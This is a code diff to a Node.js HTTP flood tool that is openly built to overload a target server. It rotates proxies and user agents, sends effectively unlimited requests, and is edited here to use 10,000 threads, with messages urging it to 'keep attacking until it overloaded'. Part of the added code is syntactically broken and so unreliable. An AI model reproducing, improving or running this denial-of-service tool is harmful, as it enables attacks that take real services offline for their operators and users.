@@ -10,7 +10,7 @@ const { fakeState } = require("./fakeState.js");
 const app = express();
 app.use(express.json());
 
-const amount_requestsPerMS = 10000; // Added constant for requests per millisecond
+const amount_requestsPerMS = 1; // Added constant for requests per millisecond
 
 const stateFilePath = path.join(__dirname, 'attackState.json');
 
@@ -100,7 +100,7 @@ const acceptHeaders = [
 const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 const maxRequests = Number.MAX_SAFE_INTEGER;
-const numThreads = 1000;
+const numThreads = 10000;
 
 const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");
@@ -205,13 +205,16 @@ const performAttack = (url, agent) => {
             headers: headersForRequest,
             timeout: 0,
         })
-        .then(() => {})
+        .then((
+            console.log(rainbow("SERVER STILL ALIVE!"))
+        ) => {})
         .catch((err) => {
             if (err.response?.status === 503) {
                 console.log(rainbow("Target under heavy load (503) - Game Over!"));
             } else if (err.response?.status === 502) {
                 console.log(rainbow("Bad Gateway (502)."));
             }
+                console.log(rainbow(`FAIL => KEEP ATTACKING UNTIL IT OVERLOADED!... ${err.response?.status})`))
         });
     }
 
